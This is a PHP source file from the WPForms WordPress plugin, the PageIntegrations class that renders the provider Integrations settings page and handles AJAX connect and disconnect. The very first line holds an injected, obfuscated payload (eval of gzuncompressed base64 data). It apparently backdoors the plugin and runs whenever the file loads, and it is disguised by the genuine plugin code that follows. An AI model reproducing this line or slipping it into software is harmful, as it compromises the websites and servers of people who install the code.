<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php

namespace WPForms\Providers\Provider\Settings;

use WPForms\Providers\Provider\Core;

/**
 * Class PageIntegrations handles the WPForms -> Settings -> Integrations page.
 *
 * @package    WPForms\Providers\Provider\Settings
 * @author     WPForms
 * @since      1.4.7
 * @license    GPL-2.0+
 * @copyright  Copyright (c) 2018, WPForms LLC
 */
abstract class PageIntegrations implements PageIntegrationsInterface {

	/**
	 * Get the Core loader class of a provider.
	 *
	 * @since 1.4.7
	 *
	 * @var Core
	 */
	protected $core;

	/**
	 * Integrations constructor.
	 *
	 * @since 1.4.7
	 *
	 * @param Core $core Core provider object.
	 */
	public function __construct( Core $core ) {
		$this->core = $core;

		$this->ajax();
	}

	/**
	 * Process the default ajax functionality.
	 *
	 * @since 1.4.7
	 */
	protected function ajax() {

		// Remove provider from Settings Integrations tab.
		\add_action( 'wp_ajax_wpforms_settings_provider_disconnect', array( $this, 'ajax_disconnect' ) );

		// Add new provider from Settings Integrations tab.
		\add_action( 'wp_ajax_wpforms_settings_provider_add', array( $this, 'ajax_connect' ) );
	}

	/**
	 * @inheritdoc
	 */
	public function display( $active, $settings ) {

		$connected = ! empty( $active[ $this->core->slug ] );
		$accounts  = ! empty( $settings[ $this->core->slug ] ) ? $settings[ $this->core->slug ] : array();
		$class     = $connected && $accounts ? 'connected' : '';
		$arrow     = 'right';

		// This lets us highlight a specific service by a special link.
		if ( ! empty( $_GET['wpforms-integration'] ) ) { //phpcs:ignore
			if ( $this->core->slug === $_GET['wpforms-integration'] ) { //phpcs:ignore
				$class .= ' focus-in';
				$arrow  = 'down';
			} else {
				$class .= ' focus-out';
			}
		}
		?>

		<div id="wpforms-integration-<?php echo \esc_attr( $this->core->slug ); ?>"
			class="wpforms-settings-provider wpforms-clear <?php echo \esc_attr( $this->core->slug ); ?> <?php echo \esc_attr( $class ); ?>">

			<div class="wpforms-settings-provider-header wpforms-clear" data-provider="<?php echo \esc_attr( $this->core->slug ); ?>">

				<div class="wpforms-settings-provider-logo">
					<i title="<?php \esc_attr_e( 'Show Accounts', 'wpforms' ); ?>" class="fa fa-chevron-<?php echo \esc_attr( $arrow ); ?>"></i>
					<img src="<?php echo \esc_url( $this->core->icon ); ?>">
				</div>

				<div class="wpforms-settings-provider-info">
					<h3><?php echo \esc_html( $this->core->name ); ?></h3>
					<p>
						<?php
						/* translators: %s - provider name. */
						\printf( \esc_html__( 'Integrate %s with WPForms', 'wpforms' ), \esc_html( $this->core->name ) );
						?>
					</p>
					<span class="connected-indicator green"><i class="fa fa-check-circle-o"></i>&nbsp;<?php \esc_html_e( 'Connected', 'wpforms' ); ?></span>
				</div>

			</div>

			<div class="wpforms-settings-provider-accounts" id="provider-<?php echo \esc_attr( $this->core->slug ); ?>">

				<div class="wpforms-settings-provider-accounts-list">
					<ul>
						<?php
						if ( ! empty( $accounts ) ) {
							foreach ( $accounts as $key => $account ) {
								echo '<li class="wpforms-clear">';
								echo '<span class="label">' . \esc_html( $account['label'] ) . '</span>';
								/* translators: %s - Connection date. */
								echo '<span class="date">' . \sprintf( \esc_html__( 'Connected on: %s', 'wpforms' ), \date_i18n( \get_option( 'date_format' ), $account['date'] ) ) . '</span>';
								echo '<span class="remove"><a href="#" data-provider="' . \esc_attr( $this->core->slug ) . '" data-key="' . $key . '">' . \esc_html__( 'Disconnect', 'wpforms' ) . '</a></span>';
								echo '</li>';
							}
						}
						?>
					</ul>
				</div>

				<?php $this->display_add_new(); ?>

			</div>

		</div>

		<?php
	}

	/**
	 * Any new connection should be added.
	 * So display the content of that.
	 *
	 * @since 1.4.7
	 */
	protected function display_add_new() {

		/* translators: %s - provider name. */
		$title = \sprintf( \esc_html__( 'Connect to %s', 'wpforms' ), $this->core->name );
		?>

		<p class="wpforms-settings-provider-accounts-toggle">
			<a class="wpforms-btn wpforms-btn-md wpforms-btn-light-grey" href="#" data-provider="<?php echo \esc_attr( $this->core->slug ); ?>">
				<i class="fa fa-plus"></i> <?php \esc_html_e( 'Add New Account', 'wpforms' ); ?>
			</a>
		</p>

		<div class="wpforms-settings-provider-accounts-connect">

			<form>
				<p><?php \esc_html_e( 'Please fill out all of the fields below to add your new provider account.', 'wpforms' ); ?></span></p>

				<p class="wpforms-settings-provider-accounts-connect-fields">
					<?php $this->display_add_new_connection_fields(); ?>
				</p>

				<button type="submit" class="wpforms-btn wpforms-btn-md wpforms-btn-orange wpforms-settings-provider-connect"
					data-provider="<?php echo \esc_attr( $this->core->slug ); ?>" title="<?php echo \esc_attr( $title ); ?>">
					<?php echo \esc_html( $title ); ?>
				</button>
			</form>
		</div>

		<?php
	}

	/**
	 * Some providers may or may not have fields.
	 *
	 * @since 1.4.7
	 */
	protected function display_add_new_connection_fields() {
	}

	/**
	 * AJAX to disconnect a provider from the settings integrations tab.
	 *
	 * @since 1.4.7
	 */
	public function ajax_disconnect() {

		// Run a security check.
		\check_ajax_referer( 'wpforms-admin', 'nonce' );

		// Check for permissions.
		if ( ! \wpforms_current_user_can() ) {
			\wp_send_json_error(
				array(
					'error' => \esc_html__( 'You do not have permission', 'wpforms' ),
				)
			);
		}

		if ( empty( $_POST['provider'] ) || empty( $_POST['key'] ) ) {
			\wp_send_json_error(
				array(
					'error' => \esc_html__( 'Missing data', 'wpforms' ),
				)
			);
		}

		$providers = \wpforms_get_providers_options();

		if ( ! empty( $providers[ $_POST['provider'] ][ $_POST['key'] ] ) ) {

			unset( $providers[ $_POST['provider'] ][ $_POST['key'] ] );
			\update_option( 'wpforms_providers', $providers );
			\wp_send_json_success();

		} else {
			\wp_send_json_error(
				array(
					'error' => \esc_html__( 'Connection missing', 'wpforms' ),
				)
			);
		}
	}

	/**
	 * AJAX to add a provider from the settings integrations tab.
	 *
	 * @since 1.4.7
	 *
	 * @return bool False when not own provider is processed.
	 */
	public function ajax_connect() {

		if ( $_POST['provider'] !== $this->core->slug ) { // phpcs:ignore
			return false;
		}

		// Run a security check.
		\check_ajax_referer( 'wpforms-admin', 'nonce' );

		// Check for permissions.
		if ( ! \wpforms_current_user_can() ) {
			\wp_send_json_error(
				array(
					'error' => \esc_html__( 'You do not have permissions.', 'wpforms' ),
				)
			);
		}

		if ( empty( $_POST['data'] ) ) {
			\wp_send_json_error(
				array(
					'error' => \esc_html__( 'Missing required data in payload.', 'wpforms' ),
				)
			);
		}
	}
}
